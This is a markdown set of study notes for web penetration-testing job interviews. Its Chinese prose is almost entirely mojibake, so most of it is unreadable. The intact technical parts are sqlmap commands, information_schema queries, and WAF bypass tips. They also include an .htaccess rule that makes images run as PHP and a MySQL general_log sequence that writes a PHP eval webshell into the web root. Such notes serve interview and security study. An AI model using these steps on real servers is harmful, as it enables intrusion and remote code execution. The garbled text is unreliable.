# 2023å±Šé¢è¯•é¢˜ä¸ªäººå­¦ä¹ è®°å½•æ€»ç»“

> **æŒ‰ç…§æŠ€æœ¯ç§ç±»åˆ’åˆ†è¯•é¢˜**

## æŠ€æœ¯ç¯‡â€”â€”WEB

### 1. æ¸—é€çš„æµç¨‹ or æ‹¿åˆ°ä¸€ä¸ªå¾…æ£€æµ‹çš„ç«™ï¼Œä½ è§‰å¾—åº”è¯¥åšä»€ä¹ˆï¼Ÿ

> é¦–å…ˆæ‹¿åˆ°ä¹¦é¢çš„æˆæƒä¹¦
>
> 1. ä¿¡æ¯æ”¶é›† [2022æ¸—é€æµ‹è¯•é¢è¯•å¤§å…¨ï¼ˆè¿‡æ¥äººçš„å…¨éƒ¨å®¶åº•ï¼‰ (chowdera.com)](https://chowdera.com/2022/122/202205022132180805.html#æ¸—é€æµ‹è¯•æµç¨‹)
>    + ç»™äº†ä¸€ä¸ªç½‘å€ï¼ŒwhoisåæŸ¥ä¿¡æ¯ï¼Œè·å–åŸŸåæ³¨å†Œè€…çš„é‚®ç®±å’Œæ‰‹æœºå·ç­‰ä¿¡æ¯ï¼›
>    + æŸ¥çœ‹æ˜¯å¦æœ‰CDNï¼›ğŸš©
>    + æŸ¥è¯¢æœåŠ¡å™¨æ—ç«™ä»¥åŠå­åŸŸåç«™ç‚¹ï¼Œå› ä¸ºä¸»ç«™ä¸€èˆ¬æ¯”è¾ƒéš¾æ¸—é€ï¼Œæ‰€æœ‰å…ˆçœ‹çœ‹æ—ç«™æœ‰æ²¡æœ‰é€šç”¨é†’çš„cmsæˆ–è€…å…¶ä»–æ¼æ´ï¼›
>    + æŸ¥çœ‹æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œwebä¸­é—´ä»¶ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨å·²çŸ¥çš„æ¼æ´ï¼Œä¾‹å¦‚IISã€Apacheã€Nginxçš„è§£ææ¼æ´ï¼›
>    + æ‰«æIPç«¯å£ï¼Œè¿›è¡ŒIPç«¯å£çš„æ‰«æï¼Œå¯¹å“åº”çš„ç«¯å£è¿›è¡Œæ¢æµ‹ï¼Œæ¯”å¦‚mysql-3306ã€ftp-21ã€ssh-22ç­‰ï¼›
>    + æ‰«æç½‘ç«™ç›®å½•ç»“æ„ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥éå†ç›®å½•ï¼Œæˆ–è€…æ•æ„Ÿæ–‡ä»¶æ³„éœ²ã€‚
>    + google hack è¿›ä¸€æ­¥æ¢æµ‹ç½‘ç«™çš„ä¿¡æ¯ï¼Œåå°ï¼Œæ•æ„Ÿæ–‡ä»¶ï¼›
>    + å¯ä»¥å¯¹ç½‘ç«™æ¶æ„æ¢æµ‹-è·å–ç½‘ç«™çš„æ’ä»¶ä¿¡æ¯ï¼Œæ¯”å¦‚æ‰€jsç‰ˆæœ¬ã€cmsç±»å‹ï¼Œä¸­é—´ä»¶ä¿¡æ¯ã€‚å¦‚ç«ç‹æ’ä»¶wappalyzerï¼ŒcmsæŒ‡çº¹è¯†åˆ«ï¼›
>    + èµ„äº§æ”¶é›†å·¥å…·-ç¯å¡”ç³»ç»Ÿã€‚
> 2. æ¼æ´æ‰«æ
>    + å¼€å§‹æ£€æµ‹æ¼æ´ï¼Œä½¿ç”¨æ¼æ‰«å·¥å…·ï¼Œå¦‚awvsã€nessusã€appscanã€xrayã€‚åŒæ—¶ï¼Œé…åˆæ‰‹åŠ¨æµ‹è¯•ï¼Œå¦‚SQLæ³¨å…¥ã€xssè·¨ç«™è„šæœ¬ã€CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ ã€XXEæ¼æ´ã€ssrfæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€è¶Šæƒè®¿é—®ã€ååºåˆ—åŒ–ã€æ–‡ä»¶è§£ææ¼æ´ç­‰ã€‚
> 3. æ¼æ´åˆ©ç”¨
>    + å¯ä»¥åˆ©ç”¨ä¸€äº›æ–¹å¼æ‹¿åˆ°webshellã€‚å¦‚SQLæ³¨å…¥-sqlmapï¼Œxssè·¨ç«™è„šæœ¬-Beef-xssã€æŠ“åŒ…å·¥å…·-burpã€æ–‡ä»¶ä¸Šä¼ æ¼æ´-ä¸€å¥è¯æœ¨é©¬ï¼›
> 4. æƒé™æå‡
>    + è·å¾—äº†webshellåï¼Œä¸€èˆ¬æƒé™å¾ˆä½ï¼Œéœ€è¦è¿›è¡Œææƒæ“ä½œã€‚åœ¨è¿™é‡Œå…ˆç®€å•ä»‹ç»æå–æ–¹å¼
>    + windowsææƒï¼šå†…æ ¸æ¼æ´ã€æœåŠ¡é…ç½®é”™è¯¯ç­‰
>    + linuxææƒï¼šsuidã€å†…æ ¸æ¼æ´ã€dockeré€ƒé€¸ç­‰
>    + mysqlææƒï¼šudfã€mofç­‰

### 2. å¦‚ä½•æŸ¥æ‰¾éƒ¨ç½²CDNç½‘ç«™çš„çœŸå®IP?    ***

> 1. å­åŸŸåè§£æ
> 2. å›½å¤–dnsè·å–çœŸå®ipï¼›
> 3. icoå›¾æ ‡é€šè¿‡ç©ºé—´æœç´¢æ‰¾çœŸå®ip
> 4. 

### 3. ä¸šåŠ¡é€»è¾‘æ¼æ´  ***

> 1. è¶Šæƒæ¼æ´
>    + æ°´å¹³è¶Šæƒï¼šä¸€èˆ¬æ˜¯ä¿®æ”¹getæˆ–postå‚æ•°æ¥æŸ¥çœ‹å…¶ä»–äººçš„ä¸šåŠ¡ä¿¡æ¯ï¼Œä¸€èˆ¬æ˜¯åœ¨è®¢å•å¤„æˆ–ä¸ªäººä¿¡æ¯å¤„ã€‚ä¾‹å¦‚ï¼š2ä¸ªè´¦å·ï¼Œä¿®æ”¹è´¦å·1çš„getæˆ–postæ•°æ®åŒ…å‚æ•°å»æŸ¥çœ‹è´¦å·2çš„ä¿¡æ¯ã€‚
>    + å‚ç›´è¶Šæƒï¼šä¸¤ä¸ªè´¦å·ï¼Œä¸€ä¸ªæ™®é€šè´¦å·ã€ä¸€ä¸ªç®¡ç†å‘˜è´¦å·ï¼ŒæŠ“åŒ…ä¿®æ”¹ç®¡ç†å‘˜çš„å‚æ•°ï¼Œæƒé™æ”¹å˜ï¼Œæ™®é€šè´¦å·æ‹¥æœ‰ç®¡ç†å‘˜çš„éƒ¨åˆ†æˆ–å…¨éƒ¨æƒé™ã€‚
> 2. å¯†ç æ‰¾å›
>    + æ”»å‡»è€…åªè¦é€šè¿‡åœ¨æœ¬åœ°æŠ“å–æ•°æ®åŒ…å¹¶å¯¹å…¶å†…å®¹åŠ ä»¥åˆ†æå°±èƒ½è·å–åˆ°å…¶ä»–ç”¨æˆ·çš„ç”¨æˆ·å‡­è¯ï¼Œä»è€Œè¾¾åˆ°é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç çš„ç›®çš„ï¼›
>    + 

### 4. owasp top10

![Mapping](E:\mdç¬”è®°èµ„æ–™\2023å±Šé¢è¯•é¢˜ä¸ªäººæ€»ç»“.assets\mapping.png)

~~~
A01:2021-æƒé™æ§åˆ¶å¤±æ•ˆ
A02:2021-åŠ å¯†æœºåˆ¶å¤±æ•ˆ
A03:2021-æ³¨å…¥å¼æ”»å‡»
A04:2021-ä¸å®‰å…¨è®¾è®¡ 
A05:2021-å®‰å…¨è®¾å®šç¼ºé™·
A06:2021-å±é™©æˆ–è¿‡æ—§çš„ç»„ä»¶ 
A07:2021-è®¤è¯åŠéªŒè¯æœºåˆ¶å¤±æ•ˆ
A08:2021-è½¯ä»¶åŠèµ„æ–™å®Œæ•´æ€§å¤±æ•ˆ 
A09:2021-å®‰å…¨è®°å½•åŠç›‘æ§å¤±æ•ˆ 
A10:2021-æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  
~~~

### 5. æ‹¿åˆ°ä¸€ä¸ª webshell å‘ç°ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰.htaccess æ–‡ä»¶ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Ÿ

> ä¿®æ”¹htaccessæ–‡ä»¶çš„å†…å®¹ï¼Œä»è€Œæ’å…¥è§£æä¿¡æ¯ï¼š
>
> <FilesMatch "xxx.jpg"> SetHandler application/x-httpd-php  \</FilesMatch>
> 
> è¿™æ ·å°±åˆ¶é€ äº†ä¸ªapacheè§£ææ¼æ´, xxx.jpg æ–‡ä»¶ä¼šè¢«è§£ææˆ.php æ–‡ä»¶ã€‚

### 6. åœ¨æŸåå°æ–°é—»ç¼–è¾‘ç•Œé¢çœ‹åˆ°ç¼–è¾‘å™¨ï¼Œåº”è¯¥å…ˆåšä»€ä¹ˆï¼Ÿ

> æŸ¥çœ‹ç¼–è¾‘å™¨çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œgoogle å…¬å¼€çš„EXP

### 7. 3389ç«¯å£æ— æ³•è¿æ¥çš„æƒ…å†µï¼Ÿ

> 1. æœ¬æ¥3389ç«¯å£å°±æ²¡æ‰“å¼€
> 2. å¤„äºå†…ç½‘ï¼Œéœ€è¦ç«¯å£è½¬å‘ ï¼Œä½¿ç”¨lcxå·¥å…·
> 3. ç«¯å£è¢«ä¿®æ”¹äº†
> 4. é˜²æŠ¤æ‹¦æˆª

### 8. å¦‚ä½•æ‰‹å·¥å¿«é€Ÿåˆ¤æ–­ç›®æ ‡ç«™æ˜¯ windows è¿˜æ˜¯ linux æœåŠ¡å™¨ï¼Ÿ

> å°è¯•åœ¨æ•°æ®åŒ…ä¸­ä¼ å‚ï¼ŒLinuxå¤§å°å†™æ•æ„Ÿï¼Œwindowså¤§å°å†™ä¸æ•æ„Ÿ

### 9. SQLæ³¨å…¥

> 1. **ç®€ä»‹**
>
>    + ä¸»è¦åŸå› å°±æ˜¯ç¨‹åºå‘˜åœ¨å¼€å‘ç”¨æˆ·å’Œæ•°æ®åº“äº¤äº’çš„ç³»ç»Ÿæ—¶æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ã€è½¬ä¹‰ï¼Œé™åˆ¶æˆ–å¤„ç†ä¸ä¸¥è°¨ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡è¾“å…¥ç²¾å¿ƒæ„é€ çš„å­—ç¬¦ä¸²å»éæ³•è·å–åˆ°æ•°æ®åº“ä¸­çš„ä¿¡æ¯ã€‚
>
> 2. **åˆ†ç±»**
>
>    + ä¾æ®æ³¨å…¥ç‚¹ç±»å‹åˆ†ç±»ï¼š
>
>      + æ•°å­—å‹æ³¨å…¥
>      + å­—ç¬¦å‹æ³¨å…¥
>      + æœç´¢å‹æ³¨å…¥ï¼ˆlikeï¼‰
>
>    + ä¾æ®è·å–ä¿¡æ¯çš„æ–¹å¼åˆ†ç±»ï¼š
>
>      + è”åˆæ³¨å…¥
>
>      + åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼ˆæ ¹æ®æ•°æ®åŒ…è¿”å›å»¶è¿Ÿåˆ¤æ–­ï¼‰
>
>      + åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼ˆæ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡ï¼‰
>
>      + åŸºäºæŠ¥é”™æ³¨å…¥ï¼ˆé¡µé¢ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ï¼‰
>
>      + å †å æ³¨å…¥ï¼ˆåŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥ï¼‰
>
>    + ä¾æ®æäº¤æ–¹å¼åˆ†ç±»ï¼š
>
>      + GETæ³¨å…¥
>      + POSTæ³¨å…¥
>      + COOKIEæ³¨å…¥
>      + HTTPå¤´æ³¨å…¥ï¼ˆXFFæ³¨å…¥ã€UAæ³¨å…¥ã€Refereræ³¨å…¥ï¼‰
>
> 3. **é˜²å¾¡ :triangular_flag_on_post:**
>
>    + ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œç»‘å®šå˜é‡
>    + è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦
>    + æ£€æŸ¥å˜é‡çš„æ•°æ®ç±»å‹å’Œæ ¼å¼
>    + ä½¿ç”¨ç™½åå•æ¥è§„èŒƒåŒ–è¾“å…¥éªŒè¯æ–¹æ³•
>
> 4. **ç»•è¿‡waf**
>
>    + æ›¿æ¢å…³é”®è¯
>    + æ›¿æ¢å¤§å°å†™
>    + æ’å…¥æ³¨é‡Š
>    + ç¼–ç ï¼š16è¿›åˆ¶ç¼–ç ã€Unicodeç¼–ç 
>    + ç‰¹æ®Šç¬¦å·
>    + ç¼“å†²åŒºæº¢å‡º
>
> 5. **SQLæ³¨å…¥æµç¨‹**
>
>    + é¦–å…ˆåˆ¤æ–­æ³¨å…¥æ˜¯å¦æœ‰å›æ˜¾ï¼Œæœ‰å›æ˜¾å°è¯•è”åˆæŸ¥è¯¢ï¼Œæ— å›æ˜¾æŸ¥çœ‹æ˜¯å¦æœ‰æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œæœ‰æŠ¥é”™ä¿¡æ¯å°è¯•æŠ¥é”™æ³¨å…¥ï¼›æ— å›æ˜¾æ— æŠ¥é”™ä¿¡æ¯å°è¯•ç›²æ³¨ï¼›
>    + sqlmapæ€ä¹ˆå¯¹ä¸€ä¸ªæ³¨å…¥ç‚¹æ³¨å…¥ï¼Ÿ
>      + getæäº¤ï¼šsqlmap -u æ³¨å…¥ç‚¹ç½‘å€
>      + postæäº¤ï¼šsqlmap -u â€œæ³¨å…¥ç‚¹ç½‘å€â€ --data=â€œpostå‚æ•°â€ æˆ–è€… sqlmap -r â€œæ•°æ®åŒ…æ–‡ä»¶â€
>      + å¦‚æœæ˜¯httpå¤´é‡Œé¢çš„å­—æ®µç­‰ä¿¡æ¯ï¼Œå¯ä»¥è®¿é—®çš„æ—¶å€™ï¼Œâ½¤ burpsuite æŠ“åŒ…ï¼Œ**æ³¨â¼Šå¤„â½¤*å·æ›¿æ¢**ï¼Œæ”¾åˆ°â½‚ä»¶â¾¥ï¼Œç„¶åsqlmap -r "â½‚ä»¶åœ°å€â€
>
> 6. **å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨çš„å…±åŒç‚¹ï¼Ÿ**
>
>    + éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦çš„åˆ¤æ–­
>
> 7. **æŠ¥é”™æ³¨å…¥å‡½æ•°**
>
>    + updatexml()
>    + extractvalue()
>    + floor()
>
> 8. **information_schemaæ•°æ®è¡¨è·å–ä¿¡æ¯**
>
>    + è·å–æ•°æ®åº“å
>
>      select schema_name from information_schema.schemata
>
>    + è·å–æ•°æ®è¡¨å
>
>      select table_name from information_schema.tables
>
>    + è·å–å­—æ®µå
>
>      select * from information_schema.columns where table_name = â€œâ€ and table_schema=â€œâ€
>
>    + è·å–æ•°æ®
>
>    + select id,user,password from user

### 10. Windowså’ŒLinuxä¸Šææƒçš„æ–¹å¼

**Linuxææƒ**

> 1. å†…æ ¸ææƒï¼ˆè„ç‰›ï¼‰
> 2. suidææƒ
> 3. å®šæ—¶ä»»åŠ¡ææƒ
> 4. passwdææƒ
> 5. sshå¯†é’¥ææƒï¼šè·å–åˆ°äº†.sshç›®å½•ä¸‹ç”¨æˆ·çš„ç§é’¥
> 6. ç¯å¢ƒåŠ«æŒææƒï¼šåˆ©ç”¨çš„ä¸¤ä¸ªæ¡ä»¶ï¼š1ï¼‰å­˜åœ¨å¸¦æœ‰suidçš„æ–‡ä»¶ï¼›2ï¼‰suidæ–‡ä»¶å­˜åœ¨ç³»ç»Ÿå‘½ä»¤
> 7. shadowæ–‡ä»¶ä¸­rootçš„å¯†ç è¢«ç ´è§£ææƒ
> 8. sudoææƒ
> 9. ã€‚ã€‚ã€‚ã€‚

**Windowsææƒ**

> 1. å†…æ ¸ææƒï¼ˆçƒ‚åœŸè±†ï¼‰
> 2. windowsç³»ç»Ÿé…ç½®é”™è¯¯ææƒ
> 3. æœ¬åœ°dllé…ç½®æ–‡ä»¶ææƒ
> 4. SqlServerææƒ
> 5. mysqlææƒ
> 6. ã€‚ã€‚ã€‚ã€‚ã€‚

### 11. mysqlå†™shelléœ€è¦å“ªäº›æ¡ä»¶

> 1. rootæƒé™
> 2. çŸ¥é“ç½‘ç«™çš„è·¯å¾„è€Œä¸”æ‹¥æœ‰å†™æƒé™ï¼Œèƒ½å¤Ÿé€šè¿‡into outfile å’Œ into dumpfile
> 3. secure-file-priv=
> 4. gpcå…³é—­

### 12. **phpmyadminå¦‚æœä¸èƒ½é€šè¿‡out fileå†™shellï¼Œè¿˜æœ‰å“ªäº›æ–¹å¼ã€‚**

> åˆ©ç”¨ï¼šæ—¥å¿—å¤‡ä»½è·å–shell
>
> general_log é»˜è®¤å…³é—­ï¼Œå¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚å¯ä»¥å°è¯•è‡ªå®šä¹‰æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶å‘æ—¥å¿—æ–‡ä»¶é‡Œé¢å†™å…¥å†…å®¹çš„è¯
>
> 

æŸ¥çœ‹å½“å‰æ—¥å¿—æ–‡ä»¶ï¼š

~~~mysql
 SHOW VARIABLES LIKE 'general%';
~~~


å¼€å¯æ—¥å¿—è®°å½•

~~~mysql
set global general_log = "ON";
~~~

æ›´æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„

~~~mysql
set global general_log_file='C:\\xampp\\htdocs\\tieuhoc\\b.php'
~~~

å¾€æ—¥å¿—æ–‡ä»¶é‡Œå†™å…¥ä¸€å¥è¯æœ¨é©¬

~~~mysql
select '<?php @eval($_POST[cmd]);?>';
~~~

### 13. å¦‚æœä¸æ˜¯é»˜è®¤è·¯å¾„ï¼Œå¦‚ä½•å»è·å¾—å†™shellçš„è·¯ã€‚

> 1. æ•°æ®åº“æŸ¥è¯¢ï¼šshow variales like %basedir%;
> 2. æŸ¥çœ‹phpinfo
> 3. æŸ¥çœ‹mysqlå®‰è£…æƒ…å†µ
> 4. æŠ¥é”™ä¿¡æ¯

### 14. sqlæ³¨å…¥è·å–mysqlæœ¬èº«è·¯å¾„çš„å‡½æ•°

>  @@datadir

### 15. JWT 

> Json Web Token
>
> JWTç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼ŒHeader.Payload.Signature

### 16. xsså¼¹æ¡†å‡½æ•°

> alert ã€promptã€confirmã€console.log()ç­‰ç­‰

### 17. **å¦‚æœlocalhostï¼Œ127.0.0.1è¢«å°ç¦ï¼Œå¦‚ä½•ç»•è¿‡**

>  10è¿›åˆ¶ipåœ°å€è½¬æ¢ä¸º16è¿›åˆ¶

### 18. **å‘½ä»¤æ‰§è¡Œï¼Œä¸å›æ˜¾å¦‚ä½•æ‹¿ç»“æœï¼Œä¸å‡ºç½‘å¦‚ä½•**

> å»¶æ—¶ï¼ˆping -c xxx.xxx.xxx.xxxï¼‰,dnslog,httpè¯·æ±‚,å‘½ä»¤å†…å®¹è¾“å‡ºåˆ°ç‰¹å®šæ–‡ä»¶å¹¶ä¸‹è½½

### 19. **å¦‚ä½•åˆ©ç”¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´**

> ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´çš„è¯ï¼Œå¯ä»¥ä¸‹è½½ä¸€äº›æ•æ„Ÿæ–‡ä»¶æˆ–ä¿¡æ¯ï¼Œæ¯”å¦‚db.configå¯ä»¥è·å¾—æ•°æ®åº“çš„è´¦å·å¯†ç 

### 20. **å¦‚ä½•çŸ¥é“ç½‘ç«™ç›®å½•ï¼Œtomcatçš„è·¯å¾„ã€‚**

> æŠ¥é”™ï¼Œé€šè¿‡ä»£ç ï¼šapplication.getRealPath()è·å¾—é¡¹ç›®çš„è·¯å¾„ã€‚

### 21. **CSRFå¦‚ä½•ä¿®å¤**

> å¢åŠ Token å’Œ Refererå­—æ®µ

### 22. refererå¯ä»¥ç»•è¿‡ï¼Œå¦‚ä½•æ£€æµ‹refererèƒ½å¦è¢«ç»•è¿‡

> ä½¿ç”¨å­åŸŸåç»•è¿‡ï¼ŒåŸŸåå¢åŠ a-zå’Œ0-9å¯ä»¥ç»•è¿‡ï¼ŒåŸŸåé‡å†™

### 23. **shiroååºåˆ—åŒ–åŸç†**

>  Shiro å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆï¼šè®¤è¯ã€æˆæƒã€åŠ å¯†ã€ä¼šè¯ç®¡ç†ã€ä¸Web é›†æˆã€ç¼“å­˜ç­‰ã€‚

Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚

### **24.ä¸»æµçš„shiroæ£€æµ‹keyçˆ†ç ´åŸç†ï¼Œä¸å‡ºç½‘å¦‚ä½•æ£€æµ‹**



### **25.å¦‚ä½•åˆ¤æ–­ä½¿ç”¨fastjson**



### **26.fastjsonçš„gadget**



### **27.å¦‚æœä¸€ä¸ªç½‘ç«™è¢«ä¸Šä¼ äº†webshellï¼Œå¦‚ä½•æ’æŸ¥å…¥ä¾µç‚¹**

> å…ˆä½¿ç”¨ä¸€äº›å·¥å…·ï¼Œå¯¹å…¨ç«™æºç è¿›è¡Œæ‰«æï¼Œå¯¹ç½‘ç«™ä¿®æ”¹æ—¶é—´è¿›è¡Œæ’æŸ¥ï¼ŒæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œç½‘ç»œè¿æ¥ã€è¿›ç¨‹åˆ†æç­‰ç­‰

### **28.é¢„ç¼–è¯‘åŸç†**

> æå‰ç¼–è¯‘SQLè¯­å¥ï¼Œå°†æ‰€æœ‰çš„ç”¨æˆ·è¾“å…¥éƒ½å½“åšæ•°æ®ï¼Œè€Œéè¯­æ³•ï¼›
>
> é¢„ç¼–è¯‘ä¼šè®©æ•°æ®åº“è·³è¿‡ç¼–è¯‘é˜¶æ®µï¼Œä¹Ÿå°±æ— æ³•è¿›è¡Œè¯æ³•åˆ†æï¼Œå…³é”®å­—ä¸ä¼šè¢«æ‹†å¼€ï¼Œæ‰€æœ‰å‚æ•°ç›´æ¥å˜æˆå­—ç¬¦ä¸²ï¼Œè¿›å…¥æ•°æ®åº“æ‰§è¡Œå™¨æ‰§è¡Œ

### **29.udfææƒçš„æ¡ä»¶**

> 

## æŠ€æœ¯ç¯‡â€”â€”å†…ç½‘



## æŠ€æœ¯ç¯‡â€”â€”ç³»ç»Ÿè¿ç»´



## æŠ€æœ¯ç¯‡â€”â€”ç½‘ç»œ

## ä¸ªäººé€šç”¨ç¯‡

1. è‡ªæˆ‘ä»‹ç»
2. 